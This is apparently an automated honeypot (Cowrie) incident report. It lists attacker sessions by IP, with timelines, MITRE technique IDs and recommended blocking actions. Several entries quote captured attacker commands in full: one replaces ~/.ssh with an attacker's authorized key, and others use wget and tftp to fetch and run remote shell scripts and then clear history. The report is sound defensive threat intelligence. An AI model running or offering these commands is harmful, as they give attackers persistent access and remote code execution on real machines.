| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:48:15` | `cowrie.session.connect` |
| `2026-07-01 09:48:15` | `cowrie.client.version` |
| `2026-07-01 09:48:15` | `cowrie.client.kex` |
| `2026-07-01 09:48:16` | `cowrie.login.success` |
| `2026-07-01 09:48:18` | `cowrie.session.params` |
| `2026-07-01 09:48:18` | `cowrie.command.input` |
| `2026-07-01 09:48:18` | `cowrie.command.failed` |
| `2026-07-01 09:48:18` | `cowrie.log.closed` |
| `2026-07-01 09:48:19` | `cowrie.session.params` |
| `2026-07-01 09:48:19` | `cowrie.command.input` |
| `2026-07-01 09:48:20` | `cowrie.session.file_download` |
| `2026-07-01 09:48:20` | `cowrie.log.closed` |
| `2026-07-01 09:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.185.198[.]246` to AbuseIPDB if not already reported
- [ ] Block `203.185.198[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb038a5b4f8d

| Field | Detail |
|---|---|
| **Source IP** | `203.185.198[.]246` |
| **First Seen** | 2026-07-01 09:48 |
| **Last Seen** | 2026-07-01 09:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:48:21` | `cowrie.session.connect` |
| `2026-07-01 09:48:21` | `cowrie.client.version` |
| `2026-07-01 09:48:22` | `cowrie.client.kex` |
| `2026-07-01 09:48:27` | `cowrie.login.success` |
| `2026-07-01 09:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.185.198[.]246` to AbuseIPDB if not already reported
- [ ] Block `203.185.198[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-895bf28a2174

| Field | Detail |
|---|---|
| **Source IP** | `203.185.198[.]246` |
| **First Seen** | 2026-07-01 09:48 |
| **Last Seen** | 2026-07-01 09:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:48:28` | `cowrie.session.connect` |
| `2026-07-01 09:48:28` | `cowrie.client.version` |
| `2026-07-01 09:48:29` | `cowrie.client.kex` |
| `2026-07-01 09:48:31` | `cowrie.login.success` |
| `2026-07-01 09:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.185.198[.]246` to AbuseIPDB if not already reported
- [ ] Block `203.185.198[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca526b5938eb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 09:52 |
| **Last Seen** | 2026-07-01 09:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:52:07` | `cowrie.session.connect` |
| `2026-07-01 09:52:09` | `cowrie.client.version` |
| `2026-07-01 09:52:09` | `cowrie.client.kex` |
| `2026-07-01 09:52:14` | `cowrie.login.success` |
| `2026-07-01 09:52:17` | `cowrie.session.params` |
| `2026-07-01 09:52:17` | `cowrie.command.input` |
| `2026-07-01 09:52:19` | `cowrie.log.closed` |
| `2026-07-01 09:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814f1d488b30

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 09:52 |
| **Last Seen** | 2026-07-01 09:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:52:21` | `cowrie.session.connect` |
| `2026-07-01 09:52:22` | `cowrie.client.version` |
| `2026-07-01 09:52:22` | `cowrie.client.kex` |
| `2026-07-01 09:52:23` | `cowrie.login.success` |
| `2026-07-01 09:52:25` | `cowrie.session.params` |
| `2026-07-01 09:52:25` | `cowrie.command.input` |
| `2026-07-01 09:52:25` | `cowrie.log.closed` |
| `2026-07-01 09:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46babf62fc2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 09:52 |
| **Last Seen** | 2026-07-01 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:52:58` | `cowrie.session.connect` |
| `2026-07-01 09:52:58` | `cowrie.client.version` |
| `2026-07-01 09:52:58` | `cowrie.client.kex` |
| `2026-07-01 09:52:59` | `cowrie.login.success` |
| `2026-07-01 09:53:00` | `cowrie.session.params` |
| `2026-07-01 09:53:00` | `cowrie.command.input` |
| `2026-07-01 09:53:00` | `cowrie.log.closed` |
| `2026-07-01 09:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d78f1f199eda

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-01 09:58 |
| **Last Seen** | 2026-07-01 09:58 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:58:12` | `cowrie.session.connect` |
| `2026-07-01 09:58:13` | `cowrie.login.success` |
| `2026-07-01 09:58:13` | `cowrie.session.params` |
| `2026-07-01 09:58:15` | `cowrie.command.input` |
| `2026-07-01 09:58:15` | `cowrie.command.input` |
| `2026-07-01 09:58:15` | `cowrie.session.file_download.failed` |
| `2026-07-01 09:58:30` | `cowrie.log.closed` |
| `2026-07-01 09:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9442aa56336e

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-01 09:59 |
| **Last Seen** | 2026-07-01 09:59 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64, hxxp://83.168.110[.]191/updaterros.x86_64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM), 21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c (MEDIUM), 6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e (MEDIUM), 3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569 (MEDIUM), cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:59:03` | `cowrie.session.connect` |
| `2026-07-01 09:59:03` | `cowrie.login.success` |
| `2026-07-01 09:59:04` | `cowrie.session.params` |
| `2026-07-01 09:59:05` | `cowrie.command.input` |
| `2026-07-01 09:59:05` | `cowrie.command.input` |
| `2026-07-01 09:59:06` | `cowrie.session.file_download` |
| `2026-07-01 09:59:06` | `cowrie.session.file_download` |
| `2026-07-01 09:59:06` | `cowrie.session.file_download.failed` |
| `2026-07-01 09:59:06` | `cowrie.session.file_download` |
| `2026-07-01 09:59:07` | `cowrie.session.file_download` |
| `2026-07-01 09:59:07` | `cowrie.session.file_download` |
| `2026-07-01 09:59:07` | `cowrie.session.file_download` |
| `2026-07-01 09:59:07` | `cowrie.session.file_download` |
| `2026-07-01 09:59:20` | `cowrie.log.closed` |
| `2026-07-01 09:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffdd8b90797a

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-01 09:59 |
| **Last Seen** | 2026-07-01 10:00 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:59:56` | `cowrie.session.connect` |
| `2026-07-01 09:59:56` | `cowrie.login.success` |
| `2026-07-01 09:59:57` | `cowrie.session.params` |
| `2026-07-01 09:59:58` | `cowrie.command.input` |
| `2026-07-01 09:59:58` | `cowrie.command.input` |
| `2026-07-01 09:59:58` | `cowrie.session.file_download` |
| `2026-07-01 09:59:59` | `cowrie.session.file_download` |
| `2026-07-01 09:59:59` | `cowrie.session.file_download.failed` |
| `2026-07-01 10:00:13` | `cowrie.log.closed` |
| `2026-07-01 10:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c02a2f3c6d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 10:03 |
| **Last Seen** | 2026-07-01 10:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:03:23` | `cowrie.session.connect` |
| `2026-07-01 10:03:24` | `cowrie.client.version` |
| `2026-07-01 10:03:24` | `cowrie.client.kex` |
| `2026-07-01 10:03:30` | `cowrie.login.success` |
| `2026-07-01 10:03:34` | `cowrie.session.params` |
| `2026-07-01 10:03:34` | `cowrie.command.input` |
| `2026-07-01 10:03:35` | `cowrie.log.closed` |
| `2026-07-01 10:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063ea4dd5f98

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 10:09 |
| **Last Seen** | 2026-07-01 10:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:09:17` | `cowrie.session.connect` |
| `2026-07-01 10:09:17` | `cowrie.client.version` |
| `2026-07-01 10:09:17` | `cowrie.client.kex` |
| `2026-07-01 10:09:19` | `cowrie.login.success` |
| `2026-07-01 10:09:21` | `cowrie.session.params` |
| `2026-07-01 10:09:21` | `cowrie.command.input` |
| `2026-07-01 10:09:22` | `cowrie.log.closed` |
| `2026-07-01 10:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a9b0d0ef69a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 10:14 |
| **Last Seen** | 2026-07-01 10:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:14:46` | `cowrie.session.connect` |
| `2026-07-01 10:14:47` | `cowrie.client.version` |
| `2026-07-01 10:14:47` | `cowrie.client.kex` |
| `2026-07-01 10:14:53` | `cowrie.login.success` |
| `2026-07-01 10:14:57` | `cowrie.session.params` |
| `2026-07-01 10:14:57` | `cowrie.command.input` |
| `2026-07-01 10:14:58` | `cowrie.log.closed` |
| `2026-07-01 10:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97b53c51d1cd

| Field | Detail |
|---|---|
| **Source IP** | `106.12.170[.]135` |
| **First Seen** | 2026-07-01 10:20 |
| **Last Seen** | 2026-07-01 10:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:20:30` | `cowrie.session.connect` |
| `2026-07-01 10:20:33` | `cowrie.telnet.option` |
| `2026-07-01 10:20:43` | `cowrie.telnet.option` |
| `2026-07-01 10:21:34` | `cowrie.login.success` |
| `2026-07-01 10:21:34` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `106.12.170[.]135` to AbuseIPDB if not already reported
- [ ] Block `106.12.170[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d4eae7d1415

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 10:26 |
| **Last Seen** | 2026-07-01 10:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:26:11` | `cowrie.session.connect` |
| `2026-07-01 10:26:13` | `cowrie.client.version` |
| `2026-07-01 10:26:13` | `cowrie.client.kex` |
| `2026-07-01 10:26:18` | `cowrie.login.success` |
| `2026-07-01 10:26:22` | `cowrie.session.params` |
| `2026-07-01 10:26:22` | `cowrie.command.input` |
| `2026-07-01 10:26:23` | `cowrie.log.closed` |
| `2026-07-01 10:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18beb5100f26

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 10:26 |
| **Last Seen** | 2026-07-01 10:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:26:25` | `cowrie.session.connect` |
| `2026-07-01 10:26:26` | `cowrie.client.version` |
| `2026-07-01 10:26:26` | `cowrie.client.kex` |
| `2026-07-01 10:26:28` | `cowrie.login.success` |
| `2026-07-01 10:26:30` | `cowrie.session.params` |
| `2026-07-01 10:26:30` | `cowrie.command.input` |
| `2026-07-01 10:26:30` | `cowrie.log.closed` |
| `2026-07-01 10:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f8663c72b96

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 10:27 |
| **Last Seen** | 2026-07-01 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:27:45` | `cowrie.session.connect` |
| `2026-07-01 10:27:45` | `cowrie.client.version` |
| `2026-07-01 10:27:45` | `cowrie.client.kex` |
| `2026-07-01 10:27:45` | `cowrie.login.success` |
| `2026-07-01 10:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41d4366969e5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 10:27 |
| **Last Seen** | 2026-07-01 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:27:45` | `cowrie.session.connect` |
| `2026-07-01 10:27:45` | `cowrie.client.version` |
| `2026-07-01 10:27:45` | `cowrie.client.kex` |
| `2026-07-01 10:27:45` | `cowrie.login.success` |
| `2026-07-01 10:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea4e94f6c7a7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 10:27 |
| **Last Seen** | 2026-07-01 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:27:46` | `cowrie.session.connect` |
| `2026-07-01 10:27:46` | `cowrie.client.version` |
| `2026-07-01 10:27:46` | `cowrie.client.kex` |
| `2026-07-01 10:27:46` | `cowrie.login.success` |
| `2026-07-01 10:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8692b1336d38

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 10:27 |
| **Last Seen** | 2026-07-01 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:27:46` | `cowrie.session.connect` |
| `2026-07-01 10:27:46` | `cowrie.client.version` |
| `2026-07-01 10:27:46` | `cowrie.client.kex` |
| `2026-07-01 10:27:46` | `cowrie.login.success` |
| `2026-07-01 10:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a592a8da0fd7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 10:29 |
| **Last Seen** | 2026-07-01 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:29:28` | `cowrie.session.connect` |
| `2026-07-01 10:29:28` | `cowrie.client.version` |
| `2026-07-01 10:29:29` | `cowrie.client.kex` |
| `2026-07-01 10:29:29` | `cowrie.login.success` |
| `2026-07-01 10:29:30` | `cowrie.session.params` |
| `2026-07-01 10:29:30` | `cowrie.command.input` |
| `2026-07-01 10:29:30` | `cowrie.log.closed` |
| `2026-07-01 10:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10f6a26699d5

| Field | Detail |
|---|---|
| **Source IP** | `62.133.169[.]58` |
| **First Seen** | 2026-07-01 10:32 |
| **Last Seen** | 2026-07-01 10:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:32:16` | `cowrie.session.connect` |
| `2026-07-01 10:32:16` | `cowrie.client.version` |
| `2026-07-01 10:32:17` | `cowrie.client.kex` |
| `2026-07-01 10:32:17` | `cowrie.login.success` |
| `2026-07-01 10:32:18` | `cowrie.session.params` |
| `2026-07-01 10:32:18` | `cowrie.command.input` |
| `2026-07-01 10:32:18` | `cowrie.command.failed` |
| `2026-07-01 10:32:18` | `cowrie.log.closed` |
| `2026-07-01 10:32:19` | `cowrie.session.params` |
| `2026-07-01 10:32:19` | `cowrie.command.input` |
| `2026-07-01 10:32:19` | `cowrie.session.file_download` |
| `2026-07-01 10:32:19` | `cowrie.log.closed` |
| `2026-07-01 10:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.133.169[.]58` to AbuseIPDB if not already reported
- [ ] Block `62.133.169[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6cbb422451

| Field | Detail |
|---|---|
| **Source IP** | `62.133.169[.]58` |
| **First Seen** | 2026-07-01 10:32 |
| **Last Seen** | 2026-07-01 10:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:32:19` | `cowrie.session.connect` |
| `2026-07-01 10:32:19` | `cowrie.client.version` |
| `2026-07-01 10:32:20` | `cowrie.client.kex` |
| `2026-07-01 10:32:20` | `cowrie.login.success` |
| `2026-07-01 10:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.133.169[.]58` to AbuseIPDB if not already reported
- [ ] Block `62.133.169[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0603ed9c9eb2

| Field | Detail |
|---|---|
| **Source IP** | `62.133.169[.]58` |
| **First Seen** | 2026-07-01 10:32 |
| **Last Seen** | 2026-07-01 10:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:32:20` | `cowrie.session.connect` |
| `2026-07-01 10:32:20` | `cowrie.client.version` |
| `2026-07-01 10:32:21` | `cowrie.client.kex` |
| `2026-07-01 10:32:21` | `cowrie.login.success` |
| `2026-07-01 10:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.133.169[.]58` to AbuseIPDB if not already reported
- [ ] Block `62.133.169[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82aedd627003

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]177` |
| **First Seen** | 2026-07-01 10:36 |
| **Last Seen** | 2026-07-01 10:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
